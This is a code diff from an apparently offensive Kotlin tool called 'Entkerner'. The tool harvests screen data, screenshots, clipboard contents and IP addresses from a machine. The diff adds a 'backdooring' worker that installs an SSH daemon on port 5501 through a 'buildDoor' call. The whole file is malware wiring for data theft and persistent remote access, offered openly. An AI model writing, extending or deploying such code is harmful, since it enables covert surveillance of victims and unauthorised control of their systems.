@@ -8,11 +8,13 @@ import io.ktor.serialization.kotlinx.json.*
 import kotlinx.coroutines.runBlocking
 import kotlinx.serialization.encodeToString
 import kotlinx.serialization.json.Json
+import net.kerner.entkerner.abstract.AbstractBackdooringWorker
 import net.kerner.entkerner.abstract.AbstractDataExtractor
 import net.kerner.entkerner.abstract.get
 import net.kerner.entkerner.extractors.screen.ScreenData
 import net.kerner.entkerner.extractors.screen.ScreenExtractionWorker
 import net.kerner.entkerner.extractors.screen.ScreenScreenshotWorker
+import net.kerner.entkerner.extractors.ssh.SSHDaemonInstaller
 import net.kerner.entkerner.extractors.standart.ClipboardExtractionWorker
 import net.kerner.entkerner.extractors.standart.IPAddressExtractionWorker
 import net.kerner.entkerner.model.SystemType
@@ -42,7 +44,7 @@ class Entkerner {
             val screenData = runExtractor<List<ScreenData>>(ScreenExtractionWorker(httpClient))
             val screenshot = runExtractor<List<String>>(ScreenScreenshotWorker(httpClient))
             val ip = runExtractor<List<String>>(IPAddressExtractionWorker(httpClient))
-
+            runInstaller(SSHDaemonInstaller(httpClient, this@Entkerner, 5501))
         }
     }
     private suspend inline fun <reified V : Any> runExtractor(dataExtractor: AbstractDataExtractor<*>): V {
@@ -50,6 +52,10 @@ class Entkerner {
         val result = dataExtractor.run<V>(file)
         println(Json.encodeToString(result))
         return result
+    }
+
+    private fun runInstaller(backdoorWorker: AbstractBackdooringWorker) {
+        backdoorWorker.buildDoor(backdoorWorker.file[system].toFile())
     }
 }
 
